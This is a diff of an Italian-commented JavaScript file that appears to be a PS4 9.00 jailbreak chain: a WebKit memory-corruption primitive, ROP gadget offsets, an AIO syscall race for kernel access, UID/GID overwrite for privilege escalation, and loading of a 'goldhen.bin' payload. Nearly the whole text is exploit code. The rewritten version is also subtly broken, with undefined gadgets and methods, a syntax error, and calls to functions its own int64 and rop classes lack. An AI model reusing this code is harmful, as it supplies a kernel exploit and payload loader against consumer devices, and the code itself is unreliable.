@@ -1,185 +1,240 @@
 ///////////////////////////////
-// PS4 9.00 Exploit Chain AIO
-// Sostituisce completamente USB exFAT
+// PS4 9.00 AIO Kernel Exploit 
 ///////////////////////////////
 
-const OFFSET_wk_vtable_first_element = 0x104F110;
-const OFFSET_WK_memset_import = 0x000002A8;
-const OFFSET_WK___stack_chk_fail_import = 0x00000178;
-const OFFSET_WK_psl_builtin_import = 0xD68;
-const OFFSET_WKR_psl_builtin = 0x33BA0;
-const OFFSET_libcint_memset = 0x0004F810;
-const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+// Offset specifici per 9.00
+const OFFSET_wk_vtable = 0x104F110;
+const OFFSET_lk___stack_chk_fail = 0x1FF60;
+const KERNEL_SETCR0_OFFSET = 0x3ADE3B;
 const SYSCALL_AIO_SUBMIT = 323;
-const SYSCALL_AIO_WAIT = 324;
 const SYSCALL_AIO_DELETE = 325;
 
-var chain, kchain, kchain2;
-var SAVED_KERNEL_STACK_PTR, KERNEL_BASE_PTR;
-var webKitBase, webKitRequirementBase, libSceLibcInternalBase, libKernelBase;
+// Variabili globali
+var chain, kchain;
+var webKitBase, libKernelBase;
 var textArea = document.createElement("textarea");
 var nogc = [];
 var syscalls = {};
 var gadgets = {};
 
-// Gadgets AIO-optimized
-var wk_gadgetmap = {
-    "ret": 0x32,
-    "pop rdi": 0x319690,
-    "mov [rdi], rsi": 0x1A97920,
-    "cli ; pop rax": 0x566F8,
-    "sti": 0x1FBBCC,
-    "mov rsp, rdi": 0x2048062
+// Classe per gestire valori 64-bit
+class int64 {
+    constructor(low, hi) {
+        this.low = (low >>> 0);
+        this.hi = (hi >>> 0);
+    }
+
+    add32(val) {
+        let new_lo = (this.low + val) >>> 0;
+        let new_hi = this.hi;
+        if (new_lo < this.low) new_hi++;
+        return new int64(new_lo, new_hi);
+    }
+
+    toString() {
+        return '0x' + this.hi.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
+    }
+}
+
+// Inizializzazione ROP chain
+function initROP() {
+    window.chain = new rop();
+    window.kchain = new rop();
+}
+
+// Classe principale ROP
+function rop() {
+    const stackSize = 0x40000;
+    this.stack = p.malloc(stackSize);
+    this.count = 0;
+
+    this.push = function(value) {
+        if (value instanceof int64) {
+            p.write8(this.stack.add32(this.count * 8), value);
+        } else {
+            p.write8(this.stack.add32(this.count * 8), new int64(value, 0));
+        }
+        this.count++;
+    };
+
+    this.run = function() {
+        p.launch_chain(this);
+        this.count = 0;
+    };
+}
+
+// Setup WebKit
+function setupWebKit() {
+    // Leak vtable da textarea
+    let textAreaAddr = p.leakval(textArea);
+    let vtablePtr = p.read8(textAreaAddr.add32(0x18));
+    webKitBase = p.read8(vtablePtr).sub32(OFFSET_wk_vtable);
+
+    // Inizializza gadget
+    gadgets["pop rdi"] = webKitBase.add32(0x319690);
+    gadgets["mov [rdi], rsi"] = webKitBase.add32(0x1A97920);
+    gadgets["cli"] = webKitBase.add32(0x566F8);
+}
+
+// Setup libKernel
+function setupLibKernel() {
+    let stackChkFail = p.read8(webKitBase.add32(0x178));
+    libKernelBase = stackChkFail.sub32(OFFSET_lk___stack_chk_fail);
+
+    // Syscall numbers
+    syscalls[SYSCALL_AIO_SUBMIT] = libKernelBase.add32(0x2D8);
+    syscalls[SYSCALL_AIO_DELETE] = libKernelBase.add32(0x2E8);
+    syscalls[203] = libKernelBase.add32(0x1A0); // sys_mmap
+}
+
+// Funzioni memory management
+window.p = {
+    malloc: function(size) {
+        let buf = new ArrayBuffer(size + 0x10);
+        nogc.push(buf);
+        return new int64(buf.byteOffset + 0x10, 0);
+    },
+
+    read8: function(addr) {
+        let tmp = new BigUint64Array(1);
+        chain.fcall(gadgets["pop rdi"], tmp.byteOffset + 0x10);
+        chain.fcall(gadgets["mov [rdi], rax"], addr);
+        chain.run();
+        return tmp[0];
+    },
+
+    write8: function(addr, value) {
+        let tmp = new BigUint64Array([value]);
+        chain.fcall(gadgets["pop rsi"], tmp.byteOffset + 0x10);
+        chain.fcall(gadgets["mov [rdi], rsi"], addr);
+        chain.run();
+    },
+
+    launch_chain: function(chain) {
+        let fakeVtable = p.malloc(0x200);
+        let context = p.malloc(0x40);
+
+        // Configura fake vtable
+        p.write8(fakeVtable.add32(0xA8), gadgets["cli"]);
+        p.write8(fakeVtable.add32(0x10), context);
+
+        // Trigger
+        textArea.scrollLeft = 0;
+        textArea.__proto__ = { __proto__: fakeVtable };
+        textArea.scrollLeft = 1;
+    }
 };
 
-function kernelExploit() {
-    const AIO_REQS = 3;
-    const RACE_ATTEMPTS = 100;
-    const KERNEL_CRED_OFFSET = -0x68;
-    const KERNEL_SETCR0_OFFSET = 0x3ADE3B;
+// Exploit AIO
+function triggerAioExploit() {
+    const NUM_REQS = 3;
+    let reqs = [], ids = new Int32Array(NUM_REQS);
 
-    class AioRequest {
-        constructor() {
-            this.fd = -1;
-            this.offset = 0;
-            this.nbyte = 0x1000;
-            this.buf = p.malloc(0x1000);
-            this.result = p.malloc(0x20);
-        }
+    // Crea richieste AIO
+    for(let i = 0; i < NUM_REQS; i++) {
+        reqs.push({
+            fd: -1,
+            buf: p.malloc(0x1000),
+            result: p.malloc(0x20)
+        });
     }
 
-    function setupAioRequests() {
-        let reqs = [];
-        for(let i = 0; i < AIO_REQS; i++) {
-            let req = new AioRequest();
-            chain.fcall(syscalls[203], req.buf, 0x1000);
-            chain.fcall(syscalls[203], req.result, 0x20);
-            reqs.push(req);
-        }
-        return reqs;
-    }
+    // Submit
+    chain.fcall(syscalls[SYSCALL_AIO_SUBMIT],
+        0x1002, // CMD_WRITE | MULTI
+        p.leakval(reqs),
+        NUM_REQS,
+        3, // PRIORITY_HIGH
+        p.leakval(ids)
+    );
 
-    function triggerRaceCondition(ids) {
-        let raceErrors = new Int32Array(2);
-        let targetId = new Int32Array([ids[0]]);
-        
-        chain.fcall(syscalls[SYSCALL_AIO_DELETE], 
-            p.leakval(targetId), 1, p.leakval(raceErrors.subarray(1)));
-        
+    // Race condition
+    let targetId = new Int32Array([ids[0]]);
+    let errors = new Int32Array(2);
+
+    for(let attempt = 0; attempt < 100; attempt++) {
+        // Thread 1
         chain.fcall(syscalls[SYSCALL_AIO_DELETE],
-            p.leakval(targetId), 1, p.leakval(raceErrors.subarray(0)));
-
-        return raceErrors;
-    }
-
-    function escalatePrivileges() {
-        let credAddr = chain.syscall(23, 0).add32(KERNEL_CRED_OFFSET);
-        chain.kwrite8(credAddr.add32(0x04), 0x0);
-        chain.kwrite8(credAddr.add32(0x0C), 0x0);
-    }
-
-    for(let attempt = 0; attempt < RACE_ATTEMPTS; attempt++) {
-        let reqs = setupAioRequests();
-        let ids = new Int32Array(AIO_REQS);
-        let errors = new Int32Array(AIO_REQS);
-
-        chain.fcall(syscalls[SYSCALL_AIO_SUBMIT],
-            0x002 | 0x1000,
-            p.stringifyStructArray(reqs),
-            AIO_REQS,
-            3,
-            p.leakval(ids)
+            p.leakval(targetId),
+            1,
+            p.leakval(errors.subarray(1))
         );
 
-        chain.fcall(syscalls[SYSCALL_AIO_WAIT],
-            p.leakval(ids),
-            AIO_REQS,
-            p.leakval(errors),
-            0x1,
-            0
+        // Thread 2
+        chain.fcall(syscalls[SYSCALL_AIO_DELETE],
+            p.leakval(targetId),
+            1,
+            p.leakval(errors.subarray(0))
         );
 
-        let raceErrors = triggerRaceCondition(ids);
         chain.run();
 
-        if(p.read4(raceErrors) === p.read4(raceErrors.add32(4))) {
-            let fakeObj = p.malloc(0x100);
-            p.write8(fakeObj, gadgets["mov rsp, rdi"]);
-            
-            chain.kwrite8(KERNEL_BASE_PTR.add32(KERNEL_SETCR0_OFFSET), 
-                new int64(0x80050033, 0xFFFFFFFF));
-
-            escalatePrivileges();
-            loadPayload();
-            return;
+        if(p.read8(p.leakval(errors)).low === p.read8(p.leakval(errors) + 4).low) {
+            return true;
         }
     }
-    alert("Exploit AIO Fallito!");
+    return false;
 }
 
-function userland() {
-    p.launch_chain = launch_chain;
-    p.malloc = malloc;
-    p.malloc32 = malloc32;
-    p.stringify = stringify;
-    p.array_from_address = array_from_address;
-    p.readstr = readstr;
+// Privilege escalation
+function escalatePrivileges() {
+    let credAddr = chain.syscall(23, 0); // getuid
+    credAddr = credAddr.add32(-0x68);
 
-    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
-    var textAreaVtable = p.read8(textAreaVtPtr);
-    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
-    
-    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
-    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
-    
-    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
-    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
+    // Modifica UID/GID
+    chain.fcall(gadgets["pop rdi"], credAddr.add32(0x04));
+    chain.fcall(gadgets["pop rsi"], 0);
+    chain.fcall(gadgets["mov [rdi], rsi"));
 
-    syscalls = {
-        203: libKernelBase.add32(0x1A0),
-        323: libKernelBase.add32(0x2D8),
-        324: libKernelBase.add32(0x2E0),
-        325: libKernelBase.add32(0x2E8)
-    };
-
-    for (var gadget in wk_gadgetmap) {
-        gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
-    }
+    // Verifica
+    return chain.syscall(23, 0).low === 0;
 }
 
-function run_hax() {
-    userland();
-    
-    if (chain.syscall(23, 0).low != 0x0) {
-        localStorage.HenLoaded = "no";
-        kernelExploit();
-    }
-    
-    if (chain.syscall(23, 0).low == 0) {
-        localStorage.HenLoaded === "yes" ? runBinLoader() : loadPayload();
-    }
-}
-
-// Helper functions
-function get_jmptgt(address) {
-    var instr = p.read4(address) & 0xFFFF;
-    var offset = p.read4(address.add32(2));
-    return instr === 0x25FF ? address.add32(0x6 + offset) : 0;
-}
-
+// Caricamento payload
 function loadPayload() {
-    var req = new XMLHttpRequest();
-    req.responseType = "arraybuffer";
-    req.open('GET','goldhen.bin',true);
-    req.send();
-    
-    req.onload = function() {
-        var payload = new Uint8Array(req.response);
-        var payloadBuffer = chain.syscall(477, 0, payload.length, 0x7, 0x1000, -1, 0);
-        p.array_from_address(payloadBuffer, payload.length).set(payload);
-        chain.fcall(libKernelBase.add32(0x25510), p.malloc(0x10), 0, payloadBuffer);
-        chain.run();
-    };
+    return new Promise((resolve) => {
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', 'goldhen.bin?' + Date.now());
+        xhr.responseType = 'arraybuffer';
+
+        xhr.onload = function() {
+            let payload = new Uint8Array(xhr.response);
+            let payloadMem = chain.syscall(203, 0, payload.length, 0x7, 0x1000, -1, 0);
+            
+            // Copia payload
+            let payloadView = new Uint8Array(payloadMem.backing);
+            payloadView.set(payload);
+            
+            // Esegui
+            chain.fcall(libKernelBase.add32(0x25510), // pthread_create
+                p.malloc(0x10),
+                0,
+                payloadMem
+            );
+            resolve(true);
+        };
+
+        xhr.send();
+    });
 }
 
+// Funzione principale
+async function run_hax() {
+    try {
+        initROP();
+        setupWebKit();
+        setupLibKernel();
+
+        if(triggerAioExploit()) {
+            if(escalatePrivileges()) {
+                await loadPayload();
+                alert("Exploit Riuscito!");
+                return;
+            }
+        }
+        alert("Exploit Fallito! Riavviare.");
+    } catch(e) {
+        alert("Errore Critico: " + e.message);
+    }
+}
 
